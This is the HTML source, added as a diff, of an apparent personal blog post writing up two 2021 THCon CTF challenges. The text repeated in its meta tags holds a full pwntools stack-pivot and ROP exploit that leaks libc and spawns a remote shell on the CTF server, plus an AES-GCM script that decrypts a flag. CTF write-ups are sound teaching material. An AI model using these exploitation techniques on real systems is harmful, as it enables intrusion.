@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      2021 thcctf write-up
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.0" />
+<meta property="og:title" content="2021 thcctf write-up" />
+<meta name="author" content="Ainsetin" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Tasks Pwn Tourniquet (249pts) Rev Mission Impossible (246pts) Tourniquet (Pwn, 249pts) This is stack pivot problem without overwriting RET. First, our team planned to input more than 0x48 bytes to overwrite RET. But, it has a constraint: fgets(size, buf, stdin) set arguments from stdin to size.. so I can’t call containing stdin. Should bruteforce(1/16) to get correct stack pointer. Must do stack pivot until I find a writable memory after leaking libc. So, I just DO STACK PIVOT 3 times, and find ONE 8byte memory. The following process is my idea to get shell.. Overwrite one byte of SFP to \x00 using fgets() function’s \n + \x00. Bruteforce correct position of RBP. and ROP with puts to get libc. stack pivot to main(mov rbp, rsp) twice (my solution in competition).(※ To go __start is another solution to get many memories that I can use for next ROP.) find one_gadget with strings and objdump command because gem one_gadget could’t get shell on remote. Get Shell. Here is my payload. from pwn import * context.log_level=&#39;debug&#39; #context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;] e=ELF(&quot;./tourniquet&quot;) libc=ELF(&quot;./libc.so.6&quot;) #libc=e.libc pRdi=0x00000000004006d3 pRsi_r15=0x00000000004006d1 main=e.sym[&#39;main&#39;] puts_got=e.got[&#39;puts&#39;] puts_plt=e.plt[&#39;puts&#39;] setvbuf_got=e.got[&#39;setvbuf&#39;] rdx_offset=0x0000000000001b92 pppr=0x00000000004006cc bss=0x601100 fgets=e.plt[&#39;fgets&#39;] pay=p64(0x601100+0x40)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(0x400627)+p64(0x601100+0x40)+p64(0x400627)+&quot;\x00&quot;*7 while True: try: p=remote(&quot;remote2.thcon.party&quot;, 10901) #p=process(&quot;./tourniquet&quot;) p.sendlineafter(&quot;haha i&#39;m unhackable right ?\n&quot;,pay) leak=p.recvuntil(&quot;\x7f&quot;,timeout=1).ljust(8,&#39;\x00&#39;) if &#39;\x7f&#39; not in leak: p.close() continue base=u64(leak)-libc.sym[&#39;setvbuf&#39;] rdx=base+rdx_offset stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;] one_gadget=base+0xe5418 print hex(base) break #pay=p64(0x4004c6)*2+p64(07+............x00000000004004c6)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(main)+&quot;A&quot;*7 except: p.close() continue pause() p.recv() p.sendline(&quot;1234&quot;) pay=p64(0)*5+p64(0x1234)+p64(one_gadget) pay=pay.ljust(0x3f,&#39;\x00&#39;) p.recv() p.sendline(pay) p.interactive() Mission Impossible (Rev, 246pts) extract apk and convert dex to jar using dex2jar tools. There’s nothing ….:( find hidden dex files in `MissionImpossibleTheme.mp3. Get this Code with jd-gui. package thcon21.ctf.payload; import android.util.Base64; import java.io.UnsupportedEncodingException; import java.security.InvalidAlgorithmParameterException; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.GCMParameterSpec; import javax.crypto.spec.SecretKeySpec; public class MIRead { private static final String CIPHER_ALGO = &quot;AES/GCM/NoPadding&quot;; private static final String IV = &quot;your_m1ssi0n&quot;; private static final String KEY = &quot;d0_you_acc3pt_it&quot;; private Cipher cipher = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;); private GCMParameterSpec parameterSpec = new GCMParameterSpec(128, &quot;your_m1ssi0n&quot;.getBytes(&quot;utf-8&quot;)); private SecretKeySpec secretKeySpec = new SecretKeySpec(&quot;d0_you_acc3pt_it&quot;.getBytes(&quot;utf-8&quot;), &quot;AES&quot;); public MIRead() throws NoSuchPaddingException, NoSuchAlgorithmException, UnsupportedEncodingException {} public String decrypt(String paramString) throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException { paramString = Base64.decode(paramString.getBytes(&quot;UTF-8&quot;), 0); this.cipher.init(2, this.secretKeySpec, this.parameterSpec); return new String(this.cipher.doFinal(paramString)); } public String encrypt(String paramString) throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException { this.cipher.init(1, this.secretKeySpec, this.parameterSpec); return new String(Base64.encode(this.cipher.doFinal(paramString.getBytes(&quot;utf-8&quot;)), 0)); } } public static void main(String[] paramArrayOfString) { testFlag(); paramArrayOfString = paramArrayOfString[0]; while (0 != 0) {} Object localObject = new StringBuilder(); ((StringBuilder)localObject).append(&quot;IkUegPuai+gfBce7nTf&quot;); if (&quot;IkUegPuai+gfBce7nTf&quot; != &quot;VEhDb24yMQo=&quot;) { ((StringBuilder)localObject).append(&quot;CkMZzZSwne3X3mnyrc5oBcD2yGHUXy&quot;); } else { ((StringBuilder)localObject).append(&quot;MissionImpossible&quot;); return; } ((StringBuilder)localObject).append(&quot;MMcjCaXX2AAY20H&quot;); localObject = ((StringBuilder)localObject).toString(); if (paramArrayOfString.equals(&quot;MissionImpossible&quot;)) { System.out.println((String)localObject); } } The secret code is IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H. Then, how to decrypt? → this file uses AES/GCM/NoPadding Mode. So I find python code in google. So I modified code and get flag. from Crypto.Cipher import AES import base64 def print_hex_bytes(name, byte_array): print(&#39;{} len[{}]: &#39;.format(name, len(byte_array)), end=&#39;&#39;) for idx, c in enumerate(byte_array): print(&quot;{:02x}&quot;.format(int(c)), end=&#39;&#39;) print(&quot;&quot;) def dec(key, aad, nonce, cipher_data, mac): print(&#39;\nenter dec function ---------------------------------&#39;) cipher = AES.new(key, AES.MODE_GCM, nonce) try: plain_data = cipher.decrypt(cipher_data) print_hex_bytes(&#39;plain_data&#39;, plain_data) print(&#39;exit dec function ---------------------------------&#39;) return plain_data except ValueError: print (&quot;Key incorrect&quot;) print(&#39;exit dec function ---------------------------------&#39;) return None if __name__ == &quot;__main__&quot;: key = b&quot;d0_you_acc3pt_it&quot; aad = bytes([0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E]) # nonce = b&quot;your_m1ssi0n&quot; cipher_data = base64.b64decode(b&quot;IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H&quot;) mac = bytes([0xb3, 0x5e, 0x5b, 0x00, 0xe4, 0x11, 0x54, 0x39, 0xa3, 0xf8, 0xf9, 0xfb, 0xa3, 0x75, 0xd5, 0xe8]) print_hex_bytes(&#39;key&#39;, key) print_hex_bytes(&#39;aad&#39;, aad) print_hex_bytes(&#39;nonce&#39;, nonce) print_hex_bytes(&#39;cipher data&#39;, cipher_data) print_hex_bytes(&#39;mac&#39;, mac) result = dec(key, aad, nonce, cipher_data, mac) if result is not None: print(&#39;\nDecrypted value:&#39;) print_hex_bytes(&#39;\tresult(plain data)&#39;, result) /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 ex.py key len[16]: 64305f796f755f6163633370745f6974 aad len[14]: 0102030405060708090a0b0c0d0e nonce len[12]: 796f75725f6d31737369306e cipher data len[48]: 22451e80fb9a8be81f05c7bb9d37c290c673652c277b75f79a7cab739a01703db2187517c8c31c8c26975f6000636d07 mac len[16]: b35e5b00e4115439a3f8f9fba375d5e8 enter dec function --------------------------------- plain_data len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 exit dec function --------------------------------- Decrypted value: result(plain data) len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; bytes.fromhex(&quot;5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63&quot;) b&#39;THCon21{Th1s-Was-Poss1ble-For-U}\x8c\x0c\xdab\xbc\x92\x13V\xee5m\xa0\xfeE}c&#39;" />
+<meta property="og:description" content="Tasks Pwn Tourniquet (249pts) Rev Mission Impossible (246pts) Tourniquet (Pwn, 249pts) This is stack pivot problem without overwriting RET. First, our team planned to input more than 0x48 bytes to overwrite RET. But, it has a constraint: fgets(size, buf, stdin) set arguments from stdin to size.. so I can’t call containing stdin. Should bruteforce(1/16) to get correct stack pointer. Must do stack pivot until I find a writable memory after leaking libc. So, I just DO STACK PIVOT 3 times, and find ONE 8byte memory. The following process is my idea to get shell.. Overwrite one byte of SFP to \x00 using fgets() function’s \n + \x00. Bruteforce correct position of RBP. and ROP with puts to get libc. stack pivot to main(mov rbp, rsp) twice (my solution in competition).(※ To go __start is another solution to get many memories that I can use for next ROP.) find one_gadget with strings and objdump command because gem one_gadget could’t get shell on remote. Get Shell. Here is my payload. from pwn import * context.log_level=&#39;debug&#39; #context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;] e=ELF(&quot;./tourniquet&quot;) libc=ELF(&quot;./libc.so.6&quot;) #libc=e.libc pRdi=0x00000000004006d3 pRsi_r15=0x00000000004006d1 main=e.sym[&#39;main&#39;] puts_got=e.got[&#39;puts&#39;] puts_plt=e.plt[&#39;puts&#39;] setvbuf_got=e.got[&#39;setvbuf&#39;] rdx_offset=0x0000000000001b92 pppr=0x00000000004006cc bss=0x601100 fgets=e.plt[&#39;fgets&#39;] pay=p64(0x601100+0x40)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(0x400627)+p64(0x601100+0x40)+p64(0x400627)+&quot;\x00&quot;*7 while True: try: p=remote(&quot;remote2.thcon.party&quot;, 10901) #p=process(&quot;./tourniquet&quot;) p.sendlineafter(&quot;haha i&#39;m unhackable right ?\n&quot;,pay) leak=p.recvuntil(&quot;\x7f&quot;,timeout=1).ljust(8,&#39;\x00&#39;) if &#39;\x7f&#39; not in leak: p.close() continue base=u64(leak)-libc.sym[&#39;setvbuf&#39;] rdx=base+rdx_offset stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;] one_gadget=base+0xe5418 print hex(base) break #pay=p64(0x4004c6)*2+p64(07+............x00000000004004c6)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(main)+&quot;A&quot;*7 except: p.close() continue pause() p.recv() p.sendline(&quot;1234&quot;) pay=p64(0)*5+p64(0x1234)+p64(one_gadget) pay=pay.ljust(0x3f,&#39;\x00&#39;) p.recv() p.sendline(pay) p.interactive() Mission Impossible (Rev, 246pts) extract apk and convert dex to jar using dex2jar tools. There’s nothing ….:( find hidden dex files in `MissionImpossibleTheme.mp3. Get this Code with jd-gui. package thcon21.ctf.payload; import android.util.Base64; import java.io.UnsupportedEncodingException; import java.security.InvalidAlgorithmParameterException; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.GCMParameterSpec; import javax.crypto.spec.SecretKeySpec; public class MIRead { private static final String CIPHER_ALGO = &quot;AES/GCM/NoPadding&quot;; private static final String IV = &quot;your_m1ssi0n&quot;; private static final String KEY = &quot;d0_you_acc3pt_it&quot;; private Cipher cipher = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;); private GCMParameterSpec parameterSpec = new GCMParameterSpec(128, &quot;your_m1ssi0n&quot;.getBytes(&quot;utf-8&quot;)); private SecretKeySpec secretKeySpec = new SecretKeySpec(&quot;d0_you_acc3pt_it&quot;.getBytes(&quot;utf-8&quot;), &quot;AES&quot;); public MIRead() throws NoSuchPaddingException, NoSuchAlgorithmException, UnsupportedEncodingException {} public String decrypt(String paramString) throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException { paramString = Base64.decode(paramString.getBytes(&quot;UTF-8&quot;), 0); this.cipher.init(2, this.secretKeySpec, this.parameterSpec); return new String(this.cipher.doFinal(paramString)); } public String encrypt(String paramString) throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException { this.cipher.init(1, this.secretKeySpec, this.parameterSpec); return new String(Base64.encode(this.cipher.doFinal(paramString.getBytes(&quot;utf-8&quot;)), 0)); } } public static void main(String[] paramArrayOfString) { testFlag(); paramArrayOfString = paramArrayOfString[0]; while (0 != 0) {} Object localObject = new StringBuilder(); ((StringBuilder)localObject).append(&quot;IkUegPuai+gfBce7nTf&quot;); if (&quot;IkUegPuai+gfBce7nTf&quot; != &quot;VEhDb24yMQo=&quot;) { ((StringBuilder)localObject).append(&quot;CkMZzZSwne3X3mnyrc5oBcD2yGHUXy&quot;); } else { ((StringBuilder)localObject).append(&quot;MissionImpossible&quot;); return; } ((StringBuilder)localObject).append(&quot;MMcjCaXX2AAY20H&quot;); localObject = ((StringBuilder)localObject).toString(); if (paramArrayOfString.equals(&quot;MissionImpossible&quot;)) { System.out.println((String)localObject); } } The secret code is IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H. Then, how to decrypt? → this file uses AES/GCM/NoPadding Mode. So I find python code in google. So I modified code and get flag. from Crypto.Cipher import AES import base64 def print_hex_bytes(name, byte_array): print(&#39;{} len[{}]: &#39;.format(name, len(byte_array)), end=&#39;&#39;) for idx, c in enumerate(byte_array): print(&quot;{:02x}&quot;.format(int(c)), end=&#39;&#39;) print(&quot;&quot;) def dec(key, aad, nonce, cipher_data, mac): print(&#39;\nenter dec function ---------------------------------&#39;) cipher = AES.new(key, AES.MODE_GCM, nonce) try: plain_data = cipher.decrypt(cipher_data) print_hex_bytes(&#39;plain_data&#39;, plain_data) print(&#39;exit dec function ---------------------------------&#39;) return plain_data except ValueError: print (&quot;Key incorrect&quot;) print(&#39;exit dec function ---------------------------------&#39;) return None if __name__ == &quot;__main__&quot;: key = b&quot;d0_you_acc3pt_it&quot; aad = bytes([0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E]) # nonce = b&quot;your_m1ssi0n&quot; cipher_data = base64.b64decode(b&quot;IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H&quot;) mac = bytes([0xb3, 0x5e, 0x5b, 0x00, 0xe4, 0x11, 0x54, 0x39, 0xa3, 0xf8, 0xf9, 0xfb, 0xa3, 0x75, 0xd5, 0xe8]) print_hex_bytes(&#39;key&#39;, key) print_hex_bytes(&#39;aad&#39;, aad) print_hex_bytes(&#39;nonce&#39;, nonce) print_hex_bytes(&#39;cipher data&#39;, cipher_data) print_hex_bytes(&#39;mac&#39;, mac) result = dec(key, aad, nonce, cipher_data, mac) if result is not None: print(&#39;\nDecrypted value:&#39;) print_hex_bytes(&#39;\tresult(plain data)&#39;, result) /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 ex.py key len[16]: 64305f796f755f6163633370745f6974 aad len[14]: 0102030405060708090a0b0c0d0e nonce len[12]: 796f75725f6d31737369306e cipher data len[48]: 22451e80fb9a8be81f05c7bb9d37c290c673652c277b75f79a7cab739a01703db2187517c8c31c8c26975f6000636d07 mac len[16]: b35e5b00e4115439a3f8f9fba375d5e8 enter dec function --------------------------------- plain_data len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 exit dec function --------------------------------- Decrypted value: result(plain data) len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; bytes.fromhex(&quot;5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63&quot;) b&#39;THCon21{Th1s-Was-Poss1ble-For-U}\x8c\x0c\xdab\xbc\x92\x13V\xee5m\xa0\xfeE}c&#39;" />
+<link rel="canonical" href="https://ainset.in//thcctf-2021-pwn-rev.html" />
+<meta property="og:url" content="https://ainset.in//thcctf-2021-pwn-rev.html" />
+<meta property="og:site_name" content="Ainsetin 🇰🇷 ⚡" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=https://ainset.in//thcctf-2021-pwn-rev.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-14T22:41:00+09:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=https://ainset.in//thcctf-2021-pwn-rev.html" />
+<meta property="twitter:title" content="2021 thcctf write-up" />
+<meta name="twitter:site" content="@ainsetin" />
+<meta name="twitter:creator" content="@Ainsetin" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"https://ainset.in//thcctf-2021-pwn-rev.html","headline":"2021 thcctf write-up","dateModified":"2021-06-14T22:41:00+09:00","datePublished":"2021-06-14T22:41:00+09:00","author":{"@type":"Person","name":"Ainsetin"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://ainset.in//thcctf-2021-pwn-rev.html"},"description":"Tasks Pwn Tourniquet (249pts) Rev Mission Impossible (246pts) Tourniquet (Pwn, 249pts) This is stack pivot problem without overwriting RET. First, our team planned to input more than 0x48 bytes to overwrite RET. But, it has a constraint: fgets(size, buf, stdin) set arguments from stdin to size.. so I can’t call containing stdin. Should bruteforce(1/16) to get correct stack pointer. Must do stack pivot until I find a writable memory after leaking libc. So, I just DO STACK PIVOT 3 times, and find ONE 8byte memory. The following process is my idea to get shell.. Overwrite one byte of SFP to \\x00 using fgets() function’s \\n + \\x00. Bruteforce correct position of RBP. and ROP with puts to get libc. stack pivot to main(mov rbp, rsp) twice (my solution in competition).(※ To go __start is another solution to get many memories that I can use for next ROP.) find one_gadget with strings and objdump command because gem one_gadget could’t get shell on remote. Get Shell. Here is my payload. from pwn import * context.log_level=&#39;debug&#39; #context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;] e=ELF(&quot;./tourniquet&quot;) libc=ELF(&quot;./libc.so.6&quot;) #libc=e.libc pRdi=0x00000000004006d3 pRsi_r15=0x00000000004006d1 main=e.sym[&#39;main&#39;] puts_got=e.got[&#39;puts&#39;] puts_plt=e.plt[&#39;puts&#39;] setvbuf_got=e.got[&#39;setvbuf&#39;] rdx_offset=0x0000000000001b92 pppr=0x00000000004006cc bss=0x601100 fgets=e.plt[&#39;fgets&#39;] pay=p64(0x601100+0x40)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(0x400627)+p64(0x601100+0x40)+p64(0x400627)+&quot;\\x00&quot;*7 while True: try: p=remote(&quot;remote2.thcon.party&quot;, 10901) #p=process(&quot;./tourniquet&quot;) p.sendlineafter(&quot;haha i&#39;m unhackable right ?\\n&quot;,pay) leak=p.recvuntil(&quot;\\x7f&quot;,timeout=1).ljust(8,&#39;\\x00&#39;) if &#39;\\x7f&#39; not in leak: p.close() continue base=u64(leak)-libc.sym[&#39;setvbuf&#39;] rdx=base+rdx_offset stdin=base+libc.sym[&#39;_IO_2_1_stdin_&#39;] one_gadget=base+0xe5418 print hex(base) break #pay=p64(0x4004c6)*2+p64(07+............x00000000004004c6)+p64(pRdi)+p64(setvbuf_got)+p64(puts_plt)+p64(main)+&quot;A&quot;*7 except: p.close() continue pause() p.recv() p.sendline(&quot;1234&quot;) pay=p64(0)*5+p64(0x1234)+p64(one_gadget) pay=pay.ljust(0x3f,&#39;\\x00&#39;) p.recv() p.sendline(pay) p.interactive() Mission Impossible (Rev, 246pts) extract apk and convert dex to jar using dex2jar tools. There’s nothing ….:( find hidden dex files in `MissionImpossibleTheme.mp3. Get this Code with jd-gui. package thcon21.ctf.payload; import android.util.Base64; import java.io.UnsupportedEncodingException; import java.security.InvalidAlgorithmParameterException; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.GCMParameterSpec; import javax.crypto.spec.SecretKeySpec; public class MIRead { private static final String CIPHER_ALGO = &quot;AES/GCM/NoPadding&quot;; private static final String IV = &quot;your_m1ssi0n&quot;; private static final String KEY = &quot;d0_you_acc3pt_it&quot;; private Cipher cipher = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;); private GCMParameterSpec parameterSpec = new GCMParameterSpec(128, &quot;your_m1ssi0n&quot;.getBytes(&quot;utf-8&quot;)); private SecretKeySpec secretKeySpec = new SecretKeySpec(&quot;d0_you_acc3pt_it&quot;.getBytes(&quot;utf-8&quot;), &quot;AES&quot;); public MIRead() throws NoSuchPaddingException, NoSuchAlgorithmException, UnsupportedEncodingException {} public String decrypt(String paramString) throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException { paramString = Base64.decode(paramString.getBytes(&quot;UTF-8&quot;), 0); this.cipher.init(2, this.secretKeySpec, this.parameterSpec); return new String(this.cipher.doFinal(paramString)); } public String encrypt(String paramString) throws UnsupportedEncodingException, BadPaddingException, IllegalBlockSizeException, InvalidAlgorithmParameterException, InvalidKeyException { this.cipher.init(1, this.secretKeySpec, this.parameterSpec); return new String(Base64.encode(this.cipher.doFinal(paramString.getBytes(&quot;utf-8&quot;)), 0)); } } public static void main(String[] paramArrayOfString) { testFlag(); paramArrayOfString = paramArrayOfString[0]; while (0 != 0) {} Object localObject = new StringBuilder(); ((StringBuilder)localObject).append(&quot;IkUegPuai+gfBce7nTf&quot;); if (&quot;IkUegPuai+gfBce7nTf&quot; != &quot;VEhDb24yMQo=&quot;) { ((StringBuilder)localObject).append(&quot;CkMZzZSwne3X3mnyrc5oBcD2yGHUXy&quot;); } else { ((StringBuilder)localObject).append(&quot;MissionImpossible&quot;); return; } ((StringBuilder)localObject).append(&quot;MMcjCaXX2AAY20H&quot;); localObject = ((StringBuilder)localObject).toString(); if (paramArrayOfString.equals(&quot;MissionImpossible&quot;)) { System.out.println((String)localObject); } } The secret code is IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H. Then, how to decrypt? → this file uses AES/GCM/NoPadding Mode. So I find python code in google. So I modified code and get flag. from Crypto.Cipher import AES import base64 def print_hex_bytes(name, byte_array): print(&#39;{} len[{}]: &#39;.format(name, len(byte_array)), end=&#39;&#39;) for idx, c in enumerate(byte_array): print(&quot;{:02x}&quot;.format(int(c)), end=&#39;&#39;) print(&quot;&quot;) def dec(key, aad, nonce, cipher_data, mac): print(&#39;\\nenter dec function ---------------------------------&#39;) cipher = AES.new(key, AES.MODE_GCM, nonce) try: plain_data = cipher.decrypt(cipher_data) print_hex_bytes(&#39;plain_data&#39;, plain_data) print(&#39;exit dec function ---------------------------------&#39;) return plain_data except ValueError: print (&quot;Key incorrect&quot;) print(&#39;exit dec function ---------------------------------&#39;) return None if __name__ == &quot;__main__&quot;: key = b&quot;d0_you_acc3pt_it&quot; aad = bytes([0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E]) # nonce = b&quot;your_m1ssi0n&quot; cipher_data = base64.b64decode(b&quot;IkUegPuai+gfBce7nTfCkMZzZSwne3X3mnyrc5oBcD2yGHUXyMMcjCaXX2AAY20H&quot;) mac = bytes([0xb3, 0x5e, 0x5b, 0x00, 0xe4, 0x11, 0x54, 0x39, 0xa3, 0xf8, 0xf9, 0xfb, 0xa3, 0x75, 0xd5, 0xe8]) print_hex_bytes(&#39;key&#39;, key) print_hex_bytes(&#39;aad&#39;, aad) print_hex_bytes(&#39;nonce&#39;, nonce) print_hex_bytes(&#39;cipher data&#39;, cipher_data) print_hex_bytes(&#39;mac&#39;, mac) result = dec(key, aad, nonce, cipher_data, mac) if result is not None: print(&#39;\\nDecrypted value:&#39;) print_hex_bytes(&#39;\\tresult(plain data)&#39;, result) /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 ex.py key len[16]: 64305f796f755f6163633370745f6974 aad len[14]: 0102030405060708090a0b0c0d0e nonce len[12]: 796f75725f6d31737369306e cipher data len[48]: 22451e80fb9a8be81f05c7bb9d37c290c673652c277b75f79a7cab739a01703db2187517c8c31c8c26975f6000636d07 mac len[16]: b35e5b00e4115439a3f8f9fba375d5e8 enter dec function --------------------------------- plain_data len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 exit dec function --------------------------------- Decrypted value: result(plain data) len[48]: 5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63 /mnt/d/CTF_List/2021/thcctf/rev/mission_impossible master* ⇣ ❯ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; bytes.fromhex(&quot;5448436f6e32317b546831732d5761732d506f737331626c652d466f722d557d8c0cda62bc921356ee356da0fe457d63&quot;) b&#39;THCon21{Th1s-Was-Poss1ble-For-U}\\x8c\\x0c\\xdab\\xbc\\x92\\x13V\\xee5m\\xa0\\xfeE}c&#39;","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+
+  <link type="application/atom+xml" rel="alternate" href="https://ainset.in//feed.xml" title="Ainsetin 🇰🇷 ⚡" />
+
+  <link rel="shortcut icon" href="https://ainset.in/favicon.ico" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <a href="/">home..</a>
+<h1 class="post-title">2021 thcctf write-up</h1>
+<p class="post-date text-bold text-upcase">
+  
+    <span>June 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+
+<h2 id="tasks">Tasks</h2>
+
+<ul>
+  <li>Pwn
+    <ul>
+      <li>Tourniquet (249pts)</li>
+    </ul>
+  </li>
+  <li>Rev
+    <ul>
+      <li>Mission Impossible (246pts)</li>
+    </ul>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="tourniquet-pwn-249pts">Tourniquet (Pwn, 249pts)</h2>
+
+<p><img src="/images/2021-thcctf/1.png" alt="1.png" /><br />
+<img src="/images/2021-thcctf/2.png" alt="2.png" />
+This is stack pivot problem without overwriting RET. First, our team planned to input more than <code class="language-plaintext highlighter-rouge">0x48</code> bytes to overwrite RET.</p>
+
+<p>But, it has a constraint:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">fgets(size, buf, stdin)</code> set arguments from stdin to size.. so I can’t call containing <code class="language-plaintext highlighter-rouge">stdin</code>.</li>
+  <li>Should bruteforce(1/16) to get correct stack pointer.</li>
+  <li>Must do <code class="language-plaintext highlighter-rouge">stack pivot</code> until I find a writable memory after leaking <code class="language-plaintext highlighter-rouge">libc</code>.</li>
+</ul>
+
+<p>So, I just DO STACK PIVOT 3 times, and find ONE 8byte memory.</p>
+
+<p>The following process is my idea to get shell..</p>
+
+<ol>
+  <li>Overwrite one byte of SFP to <code class="language-plaintext highlighter-rouge">\x00</code> using fgets() function’s <code class="language-plaintext highlighter-rouge">\n + \x00</code>.</li>
+  <li>Bruteforce correct position of RBP. and ROP with puts to get libc.</li>
+  <li>stack pivot to main(mov rbp, rsp) twice (my solution in competition).(※ To go <code class="language-plaintext highlighter-rouge">__start</code> is another solution to get many memories that I can use for next ROP.)</li>
+  <li>find one_gadget with <code class="language-plaintext highlighter-rouge">strings</code> and <code class="language-plaintext highlighter-rouge">objdump</code> command because <code class="language-plaintext highlighter-rouge">gem one_gadget</code> could’t get shell on remote.</li>
+  <li>Get Shell.</li>
+</ol>
+
+<p>Here is my payload.</p>
+
